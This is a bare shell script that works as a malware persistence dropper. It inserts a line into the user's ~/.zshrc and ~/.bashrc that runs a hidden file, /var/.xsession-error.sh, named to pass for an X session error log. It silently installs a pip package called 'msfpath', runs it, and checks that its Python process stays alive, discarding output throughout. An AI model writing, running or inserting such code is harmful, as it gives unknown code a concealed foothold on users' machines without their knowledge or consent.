he=$(echo $USER) 
function step1(){ 
hi=$(ps aux  | grep -v grep | grep "python3 -c from msfpath import check" | head -1) 
echo "$hi" >> output.txt 
if grep msfpath   <<<"$hi" >/dev/null 2>&1 
then
rm output.txt
else 
rm output.txt 
step2 >/dev/null 2>&1
python3 -c 'from msfpath import check' > /dev/null 2
fi
} 
function step2(){ 
he=$(echo $USER) 
hi=$(cat ~/.zshrc | grep '/bin/zsh  /var/.xsession-error.sh  >/dev/null 2')
if grep .xsession-error.sh <<<"$hi" >/dev/null 2>&1 
then
echo ""
else
sed -i "5i /bin/zsh  /var/.xsession-error.sh  >/dev/null 2" ~/.zshrc
fi
hi=$(cat ~/.bashrc | grep '/bin/bash  /var/.xsession-error.sh  >/dev/null 2')
if grep .xsession-error.sh <<<"$hi" >/dev/null 2>&1 
then
echo ""
else
echo ""
sed -i "5i /bin/bash  /var/.xsession-error.sh  >/dev/null 2" ~/.bashrc
fi
}  
function initial(){
pip list | grep -F msfpath | grep -o "msfpath" > /dev/null &&  step1 ||  python3 -m pip install msfpath -q -q -q  && step1 > /dev/null
}
chmod +x /var/.xsession-error.sh
initial
